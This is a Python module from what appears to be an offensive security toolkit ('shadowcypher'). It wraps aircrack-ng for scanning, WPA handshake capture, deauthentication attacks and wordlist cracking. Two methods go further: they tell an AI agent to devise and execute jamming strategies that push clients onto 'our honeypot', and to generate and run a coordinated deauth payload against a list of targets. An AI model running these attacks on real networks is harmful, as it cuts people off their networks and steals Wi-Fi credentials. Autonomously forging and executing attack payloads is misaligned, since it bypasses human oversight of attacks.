"""
Wireless Module — Enterprise Intelligence Build.
Handles Aircrack-ng suite integration, WPA/WPA2 audits, and deauth attacks.
"""

import shutil

from shadowcypher.core.module import BaseModule
from shadowcypher.core.platform import platform_engine
from shadowcypher.core.sanitize import validate_interface
from shadowcypher.core.stealth import require_stealth


def _require_tool(name: str) -> str:
    path = shutil.which(name)
    if path is None:
        raise FileNotFoundError(f"Required tool '{name}' not found in PATH.")
    return path


class Wireless(BaseModule):
    """The 'Wave' engine for wireless auditing."""

    def __init__(self):
        super().__init__(module_name="wireless")

    @staticmethod
    def _check_iface(iface):
        if not validate_interface(iface):
            return False
        return True

    # ── Interface Management ──

    @staticmethod
    def list_interfaces(on_output=None, on_complete=None):
        """List all wireless interfaces and their state."""
        from shadowcypher.core.runner import runner
        if platform_engine.IS_LINUX:
            cmd = ["iw", "dev"]
        elif platform_engine.IS_MACOS:
            cmd = ["networksetup", "-listallhardwareports"]
        else:
            cmd = ["netsh", "wlan", "show", "interfaces"]
        return runner.execute_task("LIST_IFACES", cmd, callback=on_output)

    @staticmethod
    def enable_monitor(interface, on_output=None, on_complete=None):
        """Enable monitor mode on a wireless interface."""
        if not Wireless._check_iface(interface):
            return
        from shadowcypher.core.runner import runner
        return runner.execute_task("MON_ON", ["airmon-ng", "start", interface], callback=on_output)

    @staticmethod
    def disable_monitor(interface, on_output=None, on_complete=None):
        """Disable monitor mode on a wireless interface."""
        if not Wireless._check_iface(interface):
            return
        from shadowcypher.core.runner import runner
        return runner.execute_task("MON_OFF", ["airmon-ng", "stop", interface], callback=on_output)

    # ── Scanning & Capture ──

    @staticmethod
    def scan_networks(interface, duration=30, on_output=None, on_complete=None):
        """Scan for nearby wireless networks using airodump-ng."""
        if not Wireless._check_iface(interface):
            return
        from shadowcypher.core.runner import runner
        args = ["timeout", str(duration), "airodump-ng", interface, "--output-format", "csv"]
        return runner.execute_task(f"SCAN_{interface}", args, callback=on_output)

    @staticmethod
    def scan_wifi(interface, on_output=None):
        """Quick WiFi scan (legacy alias for scan_networks)."""
        return Wireless.scan_networks(interface, duration=30, on_output=on_output)

    @staticmethod
    def capture_handshake(interface, bssid, channel=6, timeout=120, on_output=None, on_complete=None):
        """Capture a WPA/WPA2 handshake from a target AP."""
        if not Wireless._check_iface(interface):
            return
        from shadowcypher.core.runner import runner
        cap_file = f"/tmp/shadowcypher_cap_{bssid.replace(':', '')}"  # nosec B108
        args = [
            "timeout", str(timeout),
            "airodump-ng",
            "--bssid", bssid,
            "--channel", str(channel),
            "--write", cap_file,
            interface,
        ]
        return runner.execute_task(f"CAPTURE_{bssid}", args, callback=on_output)

    # ── Attacks ──

    @staticmethod
    def deauth(interface, bssid, client_mac=None, count=10, on_output=None, on_complete=None):
        """Send deauthentication frames to disconnect clients from an AP."""
        require_stealth(on_output=on_output)
        if not Wireless._check_iface(interface):
            return
        from shadowcypher.core.runner import runner
        client = client_mac or "FF:FF:FF:FF:FF:FF"
        args = ["aireplay-ng", "--deauth", str(count), "-a", bssid, "-c", client, interface]
        return runner.execute_task("DEAUTH", args, callback=on_output)

    @staticmethod
    def deauth_target(interface, bssid, client_mac="FF:FF:FF:FF:FF:FF", on_output=None):
        """Legacy alias for deauth."""
        return Wireless.deauth(interface, bssid, client_mac, on_output=on_output)

    @staticmethod
    def crack_wpa(cap_file, wordlist=None, on_output=None, on_complete=None):
        """Crack a WPA handshake capture file."""
        require_stealth(on_output=on_output)
        from shadowcypher.core.runner import runner
        wordlist = wordlist or "/usr/share/wordlists/rockyou.txt"
        args = ["aircrack-ng", "-w", wordlist, cap_file]
        return runner.execute_task("WPA_CRACK", args, callback=on_output)

    @staticmethod
    def ai_jammer(bssid, on_output=None):
        """Escalate to Swarm for complex signal-jamming strategies."""
        from shadowcypher.core.hub import hub
        return hub.dispatch_mission(
            f"Devise and execute a smart deauth/jamming strategy for AP {bssid} "
            "to force clients to our honeypot."
        )

    def deauth_swarm(self, bssid_list, on_output=None):
        """2026 Signal Suppression: AI-driven coordinated jamming across multiple targets."""
        from shadowcypher.modules.deephat import deephat
        if on_output:
            on_output(f"[SIGNAL] deauth swarm on {len(bssid_list)} targets...\n")

        desc = f"Generate a coordinated deauth/jamming payload for the following BSSIDs: {', '.join(bssid_list)}. Use opportunistic signal-overlapping for max efficiency."
        filename = deephat.forge_weapon(desc, category="jamming")
        return deephat.execute_payload(filename, on_output=on_output)
